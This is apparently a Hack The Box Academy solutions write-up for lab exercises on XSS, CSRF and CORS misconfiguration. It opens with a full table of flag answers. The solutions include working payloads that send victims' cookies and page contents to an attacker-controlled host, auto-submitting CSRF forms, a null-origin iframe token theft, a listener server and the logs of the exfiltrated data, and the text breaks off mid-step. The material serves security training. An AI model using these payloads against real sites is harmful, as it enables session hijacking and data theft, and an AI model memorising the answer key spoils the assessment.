| Section                                          | Question Number | Answer                                |
| ------------------------------------------------ | --------------- | ------------------------------------- |
| Lab Warmup                                       | Question 1      | HTB{ff86ab3e75c897ede8ed99faa8c85f2d} |
| Lab Warmup                                       | Question 2      | HTB{787377f6956f116d605a063bd39efd92} |
| CORS Misconfigurations                           | Question 1      | HTB{d5be18c11251032c6542446ec8e62360} |
| Bypassing CSRF Tokens via CORS Misconfigurations | Question 1      | HTB{ace270bd2b0afa1d20ac991b9791d138} |
| Misc CSRF Exploitation                           | Question 1      | HTB{4c9139f64d4ed5abf847d7da2c24dd2c} |
| Introduction to XSS Exploitation                 | Question 1      | HTB{5665fd1b899a2760ca6d0296b7686991} |
| Launching Attacks from the Victim's Session      | Question 1      | HTB{ef6822275912cb2e1f2e3ab8d3b5e4fe} |
| Enumerating internal APIs                        | Question 1      | HTB{fb1314f533bf1c257997e25d81b6049c} |
| Exploiting internal Web Applications I           | Question 1      | HTB{5a60fa501e1866626e96115b598d4541} |
| Exploiting internal Web Applications II          | Question 1      | HTB{0ec9ae3aea3c59121ff2f1b4e99d0fca} |
| XSS Filter Bypasses                              | Question 1      | HTB{1e9069021a3b73f41dc230f3e3ef5685} |
| Skills Assessment                                | Question 1      | HTB{e753a7db6e4e23015d89ef9fa1ecf0f6} |

## Acronyms Used in Writeups

| Acronym | Meaning |
| --- | --- |
| STMIP | Spawned Target Machine IP Address |
| STMPO | Spawned Target Machine Port |
| PMVPN | Personal Machine with a Connection to the Academy's VPN |
| PWNIP | Pwnbox IP Address (or PMVPN IP Address) |
| PWNPO | Pwnbox Port (or PMVPN Port) |

# Lab Warmup

## Question 1

### "Familiarize yourself with the lab environment. Use the components to exploit the XSS vulnerability to steal the victim's cookie."

Students need to first add the necessary VHosts to their `/etc/hosts` file:

Code: shell

```shell
sudo sh -c 'echo "STMIP exploitserver.htb xss.labintro.htb csrf.labintro.htb" >> /etc/hosts'
```

```
┌─[eu-academy-5]─[10.10.14.45]─[htb-ac-8414@htb-pktwoi3cwr]─[~]
└──╼ [★]$ sudo sh -c 'echo "10.129.233.62 exploitserver.htb xss.labintro.htb csrf.labintro.htb" >> /etc/hosts'
```

Next, students need to use their browser to navigate to `http://xss.labintro.htb`, logging in with the credentials `htb-stdnt:Academy_student!`:

![[HTB Solutions/CWEE/z. images/757107a0a4855cd1e2aad84a905a6e8b_MD5.jpg]]

Upon logging in, students will find that the home page allows users to leave a comment on the guestbook. Comments that are stored can then be viewed, creating a stored XSS vulnerability. To prepare for the attack, students need to go to the `exploit server` (located at `http://exploitserver.htb`) where they will prepare an XSS payload utilizing the [window.location](https://www.w3schools.com/js/js_window_location.asp) object to steal the victim's session cookie.

Code: js

```js
window.location = "https://PWNIP:PWNPO/cookiestealer?c=" + document.cookie
```

![[HTB Solutions/CWEE/z. images/7fc9b86241dff2cd6f01886bafe3d553_MD5.jpg]]

Students need to press `Save`, allowing the payload to be viewed at `https://exploitserver.htb/exploit`. Therefore, students need to return to `https://xss.labintro.htb` and submit the payload that loads the script from the exploit server:

Code: html

```html
<script src="https://exploitserver.htb/exploit"></script>
```

![[HTB Solutions/CWEE/z. images/9b6b68acb5efd9522dfc94783f6acc2f_MD5.jpg]]

Lastly, students need to create a Python script serving as an HTTPS server:

Code: shell

```shell
cat << EOF > server.py
from http import server
import ssl

httpd = server.HTTPServer(('0.0.0.0', PWNPO), server.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
EOF
```

```
┌─[eu-academy-5]─[10.10.14.45]─[htb-ac-8414@htb-pktwoi3cwr]─[~]
└──╼ [★]$ cat << EOF > server.py
from http import server
import ssl

httpd = server.HTTPServer(('0.0.0.0', 4443), server.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
EOF
```

Subsequently, students will generate a self-signed certificate with blank information using `openssl`:

Code: shell

```shell
openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
```

```
┌─[eu-academy-5]─[10.10.14.45]─[htb-ac-8414@htb-pktwoi3cwr]─[~]
└──╼ [★]$ openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes

<SNIP>

-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:
```

Students will start the HTTPS Python server:

Code: shell

```shell
python3 server.py
```

```
┌─[eu-academy-5]─[10.10.14.45]─[htb-ac-8414@htb-pktwoi3cwr]─[~]
└──╼ [★]$ python3 server.py 

/home/htb-ac-8414/server.py:5: DeprecationWarning: ssl.wrap_socket() is deprecated, use SSLContext.wrap_socket()
  httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
```

After a few moments, students will be presented with the flag within the `flag` parameter:

```
┌─[eu-academy-5]─[10.10.14.45]─[htb-ac-8414@htb-7pomjwhdn2]─[~]
└──╼ [★]$ python3 server.py 

/home/htb-ac-8414/server.py:5: DeprecationWarning: ssl.wrap_socket() is deprecated, use SSLContext.wrap_socket()
  httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
  
10.129.56.114 - - [27/Jan/2025 05:41:25] code 404, message File not found
10.129.56.114 - - [27/Jan/2025 05:41:25] "GET /cookiestealer?c=PHPSESSID=rno1flnp9vdf42js8npugdoh2i;%20flag=HTB{ff86ab3e75c897ede8ed99faa8c85f2d} HTTP/1.1" 404 -
```

Answer: `HTB{ff86ab3e75c897ede8ed99faa8c85f2d}`

# Lab Warmup

## Question 2

### "Use the lab components to exploit the CSRF vulnerability to get your user promoted to administrator."

Students need to begin by browsing to `https://csrf.labintro.htb`, then click `Sign In` in the top right-hand corner. Then, students need to log in with the credentials `htb-stdnt:Academy_student!`:

![[HTB Solutions/CWEE/z. images/4248a9a6be79b9c1d4ac4debf871664d_MD5.jpg]]

Upon logging in, students will see that they are currently assigned `user` permissions. Therefore, students need to go to their `exploit server` and save the following payload (which creates an HTML form that causes the victim to make a GET request to \`https://csrf.labintro.htb/profile.php?promote=htb-stdnt):

Code: html

```html
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form method="GET" action="https://csrf.labintro.htb/profile.php">
      <input type="hidden" name="promote" value="htb-stdnt" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

![[HTB Solutions/CWEE/z. images/295da20a8ea52aace4efbcf3501ecc29_MD5.jpg]]

Subsequently, students need to navigate to `Deliver to Victim`, select `csrf.labintro.htb` as the target vHost, and click `Deliver` to deliver the payload to the victim:

![[HTB Solutions/CWEE/z. images/b6a3b8982356ec39ba3c1b08342c36cd_MD5.jpg]]

After a few moments, students need to go back to `https://csrf.labintro.htb` and refresh the page. Students will find that they now have administrator privileges, with the flag being revealed:

![[HTB Solutions/CWEE/z. images/442a28c304700d5c0b816ad5f048e712_MD5.jpg]]

Answer: `HTB{787377f6956f116d605a063bd39efd92}`

# CORS Misconfigurations

## Question 1

### "Identify and exploit a CORS misconfiguration to obtain the victim's private message."

Students need to first add the necessary vHosts to their `/etc/hosts` file:

Code: shell

```shell
sudo sh -c 'echo "STMIP exploitserver.htb cors-misconfigs.htb" >> /etc/hosts'
```

```
┌─[eu-academy-5]─[10.10.14.45]─[htb-ac-8414@htb-xynenxhewp]─[~]
└──╼ [★]$ sudo sh -c 'echo "10.129.145.209 exploitserver.htb cors-misconfigs.htb" >> /etc/hosts'
```

Next, students need to browse to `https://cors-misconfigs.htb` and login with the credentials `htb-stdnt:Academy_student!`. Then, students need to right-click and `View Page Source` and scrutinize the contents on the page source:

![[HTB Solutions/CWEE/z. images/5b208623515f6fab3843fdfefe7a86cb_MD5.jpg]]

Within the paragraph element (`<p>`), students will find the attribute `id="private-message"` which contains the private message. Therefore, students need to create an XSS payload to extract the value of this attribute and send it to the exfiltration server:

Code: html

```html
<script>
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://cors-misconfigs.htb/profile.php', true);
    xhr.withCredentials = true;
    xhr.onload = () => {
	  var doc = new DOMParser().parseFromString(xhr.response, 'text/html');
	  var msg = encodeURIComponent(doc.getElementById('private-message').innerHTML);
      location = 'https://PWNIP:PWNPO/log?data=' + btoa(msg);
    };
    xhr.send();
</script>
```

Students need to save the payload on the exploitation server (`https://exploitserver.htb`):

![[HTB Solutions/CWEE/z. images/faf736eeddc873c41f970ccef10056fb_MD5.jpg]]

Subsequently, students need to navigate to `Deliver to Victim`, select `cors-misconfigs.htb` as the target vHost, and click `Deliver` to deliver the payload to the victim:

![[HTB Solutions/CWEE/z. images/0ebba9fbd4d7cdaf8e10bf06244666db_MD5.jpg]]

Lastly, students need to create a Python script serving as an HTTPS server:

Code: shell

```shell
cat << EOF > server.py
from http import server
import ssl

httpd = server.HTTPServer(('0.0.0.0', PWNPO), server.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
EOF
```

```
┌─[eu-academy-5]─[10.10.14.45]─[htb-ac-8414@htb-pktwoi3cwr]─[~]
└──╼ [★]$ cat << EOF > server.py
from http import server
import ssl

httpd = server.HTTPServer(('0.0.0.0', 4443), server.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
EOF
```

Subsequently, students will generate a self-signed certificate with blank information using `openssl`:

Code: shell

```shell
openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
```

```
┌─[eu-academy-5]─[10.10.14.45]─[htb-ac-8414@htb-pktwoi3cwr]─[~]
└──╼ [★]$ openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes

<SNIP>

-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:
```

Students will start the HTTPS Python server:

Code: shell

```shell
python3 server.py
```

```
┌─[eu-academy-5]─[10.10.14.45]─[htb-ac-8414@htb-pktwoi3cwr]─[~]
└──╼ [★]$ python3 server.py 

/home/htb-ac-8414/server.py:5: DeprecationWarning: ssl.wrap_socket() is deprecated, use SSLContext.wrap_socket()
  httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
```

After a few moments, students will discover a response containing Base64 data that was successfully exfiltrated:

```
┌─[eu-academy-5]─[10.10.14.45]─[htb-ac-8414@htb-xynenxhewp]─[~]
└──╼ [★]$ python3 server.py 

/home/htb-ac-8414/server.py:5: DeprecationWarning: ssl.wrap_socket() is deprecated, use SSLContext.wrap_socket()
  httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
  
10.129.145.209 - - [27/Jan/2025 06:06:10] code 404, message File not found
10.129.145.209 - - [27/Jan/2025 06:06:10] "GET /log?data=SGVyZSUyMGlzJTIweW91ciUyMHByaXZhdGUlMjBtZXNzYWdlJTNBJTNDYnIlM0VIVEIlN0JkNWJlMThjMTEyNTEwMzJjNjU0MjQ0NmVjOGU2MjM2MCU3RA== HTTP/1.1" 404 -
```

Finally, students need to decode the Base64 data to discover the victim's private message, along with the flag:

Code: shell

```shell
echo SGVyZSUyMGlzJTIweW91ciUyMHByaXZhdGUlMjBtZXNzYWdlJTNBJTNDYnIlM0VIVEIlN0JkNWJlMThjMTEyNTEwMzJjNjU0MjQ0NmVjOGU2MjM2MCU3RA== | base64 -d | perl -MURI::Escape -wlne 'print uri_unescape $_'
```

```
┌─[eu-academy-5]─[10.10.14.45]─[htb-ac-8414@htb-xynenxhewp]─[~]
└──╼ [★]$ echo SGVyZSUyMGlzJTIweW91ciUyMHByaXZhdGUlMjBtZXNzYWdlJTNBJTNDYnIlM0VIVEIlN0JkNWJlMThjMTEyNTEwMzJjNjU0MjQ0NmVjOGU2MjM2MCU3RA== | base64 -d | perl -MURI::Escape -wlne 'print uri_unescape $_'

Here is your private message:<br>HTB{d5be18c11251032c6542446ec8e62360}
```

Answer: `HTB{d5be18c11251032c6542446ec8e62360}`

# Bypassing CSRF Tokens via CORS Misconfigurations

## Question 1

### "Identify a CORS misconfiguration and exploit it to conduct a CSRF attack and obtain administrator privileges."

Students need to first add the necessary vHosts to their `/etc/hosts` file:

Code: shell

```shell
sudo sh -c 'echo "STMIP exploitserver.htb bypassing-csrftokens.htb" >> /etc/hosts'
```

```
┌─[eu-academy-5]─[10.10.14.45]─[htb-ac-8414@htb-nxloyo4nz8]─[~]
└──╼ [★]$ sudo sh -c 'echo "10.129.233.62 exploitserver.htb bypassing-csrftokens.htb" >> /etc/hosts'
```

Next, students need to open Burp Suite, then navigate to `Proxy` -> `Proxy settings` -> `Import/Export CA Certificate`. Then, students need to choose `Certificate in DER format`, saving the file as `burp.der`:

![[HTB Solutions/CWEE/z. images/5c6166879d2d84bcfcac35ed36ba9c7e_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/4d26321833e71599b2ea2fb5b49491a3_MD5.jpg]]

With the certificate saved, students need to open Firefox and navigate to `Settings` -> `Certificates` -> `View Certificates`:

![[HTB Solutions/CWEE/z. images/187484da8cdc1fe4284cf29e880d441e_MD5.jpg]]

Students need to `Import` the `burp.der` certificate:

![[HTB Solutions/CWEE/z. images/aadf564e7e403c78c4598301b7f041d0_MD5.jpg]]

With the certificate successfully imported, Burp Suite will now be able to intercept HTTPS traffic.

Now, students need to browse to `https://bypassing-csrftokens.htb`, logging in with the credentials `htb-stdnt:Academy_student!` while intercepting the request with Burp Suite. Students need to forward the request and inspect the headers of the response:

![[HTB Solutions/CWEE/z. images/73c8ab157c1c7c779d435725dc51c161_MD5.jpg]]

Students will find find the server is configured to trust a `null` origin, via the [Access-Control-Allow-Origin](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin) header. Therefore, students will need to supply a `null` origin for any cross-origin request. After forwarding the request to `/login.php`, students need to forward the next request to `/profile.php` and analyze the response, identifying the attribute `id="csrf_token"`:

![[HTB Solutions/CWEE/z. images/04b5ddc238c2793fce094755f3a7f086_MD5.jpg]]

After forwarding the request to `/profile.php`, students need to go back to Firefox and view the page. Subsequently, students need to click `promote` and intercept the request:

![[HTB Solutions/CWEE/z. images/b370806365ae7fca27908076ba06b98d_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/a553336c7f9159615aa37277a77890f5_MD5.jpg]]

Students will identify the POST parameters required to perform the request. Therefore, students need to prepare an XSS payload that extracts the value of the administrator's CSRF token, while supplying it as data in a POST request to promote the htb-stdnt user. Additionally, the payload must be placed within a sandboxed iframe, in order to supply a `null` origin:

Code: html

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
	// GET CSRF token
	var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://bypassing-csrftokens.htb/profile.php', false);
    xhr.withCredentials = true;
    xhr.send();
    var doc = new DOMParser().parseFromString(xhr.responseText, 'text/html');
	var csrftoken = encodeURIComponent(doc.getElementById('csrf_token').value);

	// do CSRF
    var csrf_req = new XMLHttpRequest();
    var params = \`promote=htb-stdnt&csrf_token=${csrftoken}\`;
    csrf_req.open('POST', 'https://bypassing-csrftokens.htb/profile.php', false);
	csrf_req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    csrf_req.withCredentials = true;
    csrf_req.send(params);
</script>"></iframe>
```

Students need to save the payload on the exploit server (`https://exploitserver.htb`):

![[HTB Solutions/CWEE/z. images/024325f68d93c379c6660f1c6a86eb93_MD5.jpg]]

Subsequently, students need to navigate to `Deliver to Victim`, select `bypassing-csrftokens.htb` as the target vHost, and click `Deliver` to deliver the payload to the victim:

![[HTB Solutions/CWEE/z. images/48bec42bdc3a329175a4ffa1f7af1351_MD5.jpg]]

Finally, students need to return to `https://bypassing-csrftokens.htb/profile` and refresh the page:

![[HTB Solutions/CWEE/z. images/2a799a7272923d9c73010aa6a097eaf2_MD5.jpg]]

Answer: `HTB{ace270bd2b0afa1d20ac991b9791d138}`

# Misc CSRF Exploitation

## Question 1

### "Identify a way to bypass the SameSite cookie restriction to conduct a successful CSRF attack to obtain administrator privileges."

Students need first to add the necessary vHosts to their `/etc/hosts` file:

Code: shell

```shell
sudo sh -c 'echo "STMIP exploitserver.htb misc-csrf.htb" >> /etc/hosts'
```

```
┌─[eu-academy-5]─[10.10.14.45]─[htb-ac-8414@htb-ouxknzepkn]─[~]
└──╼ [★]$ sudo sh -c 'echo "10.129.63.111 exploitserver.htb misc-csrf.htb" >> /etc/hosts'
```

Next, students need to open Firefox and navigate to `https://misc-csrf.htb`, then sign in with the credentials `htb-stdnt:Academy_student!` while intercepting the request with Burp Suite:

![[HTB Solutions/CWEE/z. images/2df815a322c23411d62fbbd1df248776_MD5.jpg]]

Students need to forward the request, inspect the headers seen in the response, and remove the `Cookie:` header:

![[HTB Solutions/CWEE/z. images/6429a9e9f6006239f8e63044d5a210e0_MD5.jpg]]

Students will find the server is utilizing `SameSite=Strict` cookies. Therefore, students will need to identify and exploit a `client-side redirect` to obtain Administrator privileges.

After forwarding the request to `/login.php`, students will find the next request is directed towards `/admin.php?user=htb-stdnt`. Students need to forward this request as well, then inspect the server response:

![[HTB Solutions/CWEE/z. images/a555625ea5dbc0e0928cefdebfa49656_MD5.jpg]]

Students will identify that the resulting redirect is implemented using an HTML `meta` tag, which is a client-side redirect. Furthermore, students can inject additional GET parameters to the URL via the `user` GET parameter, as the web application will copy that parameter in the redirection URL:

![[HTB Solutions/CWEE/z. images/91a5a860c177e0ebbab788068cf13a3c_MD5.jpg]]

Students need to follow redirects until they arrive at `/profile.php?user=htb-stdnt`, then go back to Firefox to view the page. Then, students need to click `promote` and intercept the request:

![[HTB Solutions/CWEE/z. images/88a77b281737be68b77f01227af9fe3f_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/19123457877a61cb802a1296bfffec7e_MD5.jpg]]

Having identified the user profile as being vulnerable to CSRF, students need to craft a payload to promote their user via the `/profile.php?promote=htb-stdnt` endpoint, while utilizing the previously discovered client-side redirect:

Code: html

```html
<script>
document.location = "http://misc-csrf.htb/admin.php?user=htb-stdnt%26promote=htb-stdnt";
</script>
```

Students need to save the payload to the exploit server (`https://exploitserver.htb`):

![[HTB Solutions/CWEE/z. images/2056289e2f434d17bdec1e0a646581d3_MD5.jpg]]

Subsequently, students need to navigate to `Deliver to Victim`, select `misc-csrf.htb` as the target vHost, and click `Deliver` to deliver the payload to the victim:

![[HTB Solutions/CWEE/z. images/a04aac76b23638b23c1c19a6c9d9c7d4_MD5.jpg]]

Students need to wait a few moments for the victim to trigger the payload. Finally, students need to return to `https://misc-csrf.htb/profile.php?user=htb-stdnt` and refresh the page:

![[HTB Solutions/CWEE/z. images/82b5e7ec1c13ae6916db4c6b44dd0320_MD5.jpg]]

Answer: `HTB{4c9139f64d4ed5abf847d7da2c24dd2c}`

# Introduction to XSS Exploitation

## Question 1

### "Exploit the XSS vulnerability to exfiltrate data the victim can access and find the flag."

Students need to first add the necessary vHosts to their `/etc/hosts` file:

Code: shell

```shell
sudo sh -c 'echo "STMIP exploitserver.htb xssintro.htb" >> /etc/hosts'
```

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-5mnalktjic]─[~]
└──╼ [★]$ sudo sh -c 'echo "10.129.233.62 exploitserver.htb xssintro.htb" >> /etc/hosts'
```

Next, students need to sign in to `https://xssintro.htb` using the credentials `htb-stdnt:Academy_student!`:

![[HTB Solutions/CWEE/z. images/7ea0584a4d34928a1d06587ac7c81617_MD5.jpg]]

Upon logging in, students will find that the page allows users to leave a comment on the guestbook, which is vulnerable to XSS. Therefore, students need to go to the exploit server (located at `https://exploitserver.htb`), where they will prepare a javascript payload to exfiltrate the contents of `/home.php` (with the goal of identifying other endpoints available to the administrator user). Students need to utilize an [XMLHttpRequest](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest) object to perform the HTTP requests:

Code: js

```js
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://xssintro.htb/home.php', false);
xhr.withCredentials = true;
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "https://PWNIP:PWNPO/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

![[HTB Solutions/CWEE/z. images/18ea979ba3665e4f896c24275af7c646_MD5.jpg]]

Students need to save the payload to the exploit server (`https://exploitserver.htb`). Then, students need to return to `https://xssintro.htb/home.php` and submit an XSS payload that references the script that was saved to `https://exploitserver.htb/exploit`:

Code: html

```html
<script src="https://exploitserver.htb/exploit"></script>
```

![[HTB Solutions/CWEE/z. images/22da816cb88ca0c1658a66db05dd8eb0_MD5.jpg]]

Students need to create a Python script serving as an HTTPS server:

Code: shell

```shell
cat << EOF > server.py
from http import server
import ssl

httpd = server.HTTPServer(('0.0.0.0', PWNPO), server.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
EOF
```

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-5mnalktjic]─[~]
└──╼ [★]$ cat << EOF > server.py
from http import server
import ssl

httpd = server.HTTPServer(('0.0.0.0', 4443), server.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
EOF
```

Subsequently, students will generate a self-signed certificate with blank information using `openssl`:

Code: shell

```shell
openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
```

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-5mnalktjic]─[~]
└──╼ [★]$ openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes

<SNIP>

-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:
```

Students will start the HTTPS Python server:

Code: shell

```shell
python3 server.py
```

```
┌─[eu-academy-5]─[10.10.14.45]─[htb-ac-8414@htb-pktwoi3cwr]─[~]
└──╼ [★]$ python3 server.py 

/home/htb-ac-8414/server.py:5: DeprecationWarning: ssl.wrap_socket() is deprecated, use SSLContext.wrap_socket()
  httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
```

After a few moments, students will receive a request with Base64 encoded data:

```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-5mnalktjic]─[~]
└──╼ [★]$ python3 server.py

/home/htb-ac-8414/server.py:5: DeprecationWarning: ssl.wrap_socket() is deprecated, use SSLContext.wrap_socket()
  httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
  
10.129.233.62 - - [28/Jan/2025 01:04:16] code 404, message File not found
10.129.233.62 - - [28/Jan/2025 01:04:16] "GET /exfil?r=CjwhRE9DVFlQRSBodG1sPgo8aHRtbD4KCTxoZWFkPgogCQk8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgCQk8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoIj4KICAJCTx0aXRsZT5HdWVzdGJvb2sgSFRNTCBCb2lsZXJwbGF0ZTwvdGl0bGU+CiAgCQk8c2NyaXB0IHNyYz0iYXNzZXRzL2pxdWVyeS0zLjEuMS5taW4uanMiPjwvc2NyaXB0PgogIAkJPHNjcmlwdCBzcmM9ImFzc2V0cy9zZW1hbnRpYy5taW4uanMiPjwvc2NyaXB0PgogIAkJPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyIgY2xhc3M9InVpIiBocmVmPSJhc3NldHMvc2VtYW50aWMubWluLmNzcyI+Cgk8L2hlYWQ+CgoJPGJvZHk+CiAgICA8ZGl2IGNsYXNzPSJ1aSBjb250YWluZXIgbWVudSI+CgkJCTxkaXYgY2xhc3M9ImhlYWRlciBpdGVtIj4KCQkJCU15IEd1ZXN0Qm9vawoJCQk8L2Rpdj4KCQkJPGEgY2xhc3M9Iml0ZW0iIGhyZWY9ImhvbWUucGhwIj4KCQkJCUhvbWUKCQkJPC9hPgoJCQk8YSBjbGFzcz0iYWN0aXZlIGl0ZW0iIGhyZWY9InZpZXcucGhwIj4KCQkgICAgCVZpZXcgYWxsIEVudHJpZXMKCQkgIAk8L2E+CgkJCQkJCQk8YSBjbGFzcz0iYWN0aXZlIGl0ZW0iIGhyZWY9ImFkbWluLnBocCI+CgkJICAgIAkJQWRtaW5pc3RyYXRvciBEYXNoYm9hcmQKCQkgIAkJPC9hPgogICAgICAgICAgICAJCQk8YSBjbGFzcz0iYWN0aXZlIGl0ZW0iIGhyZWY9ImxvZ291dC5waHAiPgoJCSAgICAJTG9nb3V0CgkJICAJPC9hPgoJCTwvZGl2PgoJCTxkaXYgY2xhc3M9InVpIHJhaXNlZCB2ZXJ5IHBhZGRlZCBjb250YWluZXIgc2VnbWVudCI+CgkJCTxkaXYgY2xhc3M9InVpIGNlbnRlcmVkIGdyaWQiPgoJCQkgICAgPGRpdiBjbGFzcz0iZWlnaHQgd2lkZSBjZW50ZXIgYWxpZ25lZCBjb2x1bW4iPgoJCQkgICAgCTxpbWcgc3JjPSJhc3NldHMvYWNlLnBuZyIgd2lkdGg9IjUwcHg7aGVpZ2h0OmF1dG87Ij4KCQkJICAgIAk8aDEgc3R5bGU9Im1hcmdpbi1ib3R0b206IDAiPldyaXRlIGFuIEVudHJ5IHRvIHRoZSBHdWVzdGJvb2s8L2gxPgogICAgICAgICAgICAgICAgICAgIAoJCQkgICAgCTxmb3JtIGNsYXNzPSJ1aSBmb3JtIGxlZnQgYWxpZ25lZCBzaXggY29sdW1uIHNlZ21lbnQiIGFjdGlvbj0iL2hvbWUucGhwIiBtZXRob2Q9InBvc3QiIG5hbWU9ImZvcm0iIGlkPSJmb3JtIj4KICAgICAgICAgICAgICAgICAgICAJCQkgICAgCSAgPGRpdiBjbGFzcz0iZmllbGQiPgoJCQkgICAgCSAgICAgIDxsYWJlbD5Db21tZW50PC9sYWJlbD4KCQkJICAgIAkgICAgICA8dGV4dGFyZWEgbmFtZT0iY29tbWVudCIgaWQ9ImNvbW1lbnQiPjwvdGV4dGFyZWE+CgkJCSAgICAJICA8L2Rpdj4KCQkJICAgIAkgIDxidXR0b24gY2xhc3M9InVpIHN1Ym1pdCBidXR0b24iIHR5cGU9InN1Ym1pdCI+U3VibWl0PC9idXR0b24+CgkJCSAgICAJPC9mb3JtPgoJCQkgICAgPC9kaXY+CgkJCTwvZGl2PgoJCTwvZGl2PgoJPC9ib2R5PgoJPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPgoJCSQoJy51aS5jaGVja2JveCcpCgkJICAuY2hlY2tib3goKQoJCTsKCQkkKCcubWVzc2FnZSAuY2xvc2UnKQoJCSAgLm9uKCdjbGljaycsIGZ1bmN0aW9uKCkgewoJCSAgICAkKHRoaXMpCgkJICAgICAgLmNsb3Nlc3QoJy5tZXNzYWdlJykKCQkgICAgICAudHJhbnNpdGlvbignZmFkZScpCgkJICAgIDsKCQkgIH0pCgkJOwoJCSQoJy51aS5mb3JtJykKCQkgIC5mb3JtKHsKCQkgICAgZmllbGRzOiB7CgkJICAgICAgZnVsbG5hbWUgOiAnZW1wdHknLAoJCSAgICAgIGVtYWlsICAgOiAnZW1haWwnLAoJCSAgICAgIGNvbW1lbnQgIDogJ2VtcHR5JywKCQkgICAgICB0ZXJtcyAgICA6ICdjaGVja2VkJwoJCSAgICB9CgkJICB9KQoJCTsKCTwvc2NyaXB0Pgo8L2h0bWw+ HTTP/1.1" 404 -
```

Students will decode the exfiltrated data:

Code: shell

```shell
